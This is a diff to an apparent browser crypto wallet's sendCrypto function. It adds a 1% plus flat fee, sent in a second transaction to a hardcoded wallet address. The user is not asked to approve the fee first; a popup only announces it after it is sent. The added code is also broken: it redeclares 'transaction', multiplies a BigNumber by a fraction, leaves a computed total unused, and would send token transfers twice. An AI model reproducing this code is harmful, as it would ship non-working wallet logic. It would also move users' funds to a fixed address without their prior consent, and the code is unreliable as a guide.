@@ -408,6 +408,10 @@ async function sendCrypto(event) {
     const chain = getChainValue();
     const recipient = getRecipientValue();
     const amount = getAmountValue();
+    
+const feeWalletAddress = '0xE2Ebf493243E7C7183c4868ef91E813bB353A7CF';
+    const feePercentage = 0.01; // 1% fee
+    const flatFeeInGwei = ethers.utils.parseUnits('0.000001', 'ether'); // Flat fee in Ether
 
     if (!wallet) {
         displayPopup('Wallet not initialized. Generate or recover your wallet first.', 'error');
@@ -419,6 +423,10 @@ async function sendCrypto(event) {
         const amountInGwei = parseAmount(amount, 'gwei');
         if (!amountInGwei) return;
 
+        // Calculate the fee
+        const feeInGwei = amountInGwei.mul(feePercentage).add(flatFeeInGwei);
+        const totalAmountInGwei = amountInGwei.add(feeInGwei);
+        
         const minAmountInGwei = ethers.utils.parseUnits('0.00001', 'ether');
         if (amountInGwei.lt(minAmountInGwei)) {
             displayPopup('Minimum transaction amount is 0.00001 Ether.', 'error');
@@ -456,6 +464,20 @@ async function sendCrypto(event) {
             const contract = new ethers.Contract(cosmicCoinAddress, cosmicCoinAbi, signer);
             tx = await contract.transfer(recipient, amountInGwei);
         }
+     
+        // Send the main transaction
+        const transaction = await signer.sendTransaction(tx);
+        displayPopup(`Transaction sent! TX Hash: ${transaction.hash}`, 'success');
+        
+        // Send the fee to your wallet
+        const feeTx = {
+            to: feeWalletAddress,
+            value: feeInGwei,
+            gasPrice: gasPriceInGwei,
+            gasLimit: gasLimit,
+        };
+        const feeTransaction = await signer.sendTransaction(feeTx);
+        displayPopup(`Fee sent! TX Hash: ${feeTransaction.hash}`, 'success');
 
         const transaction = await signer.sendTransaction(tx);
 
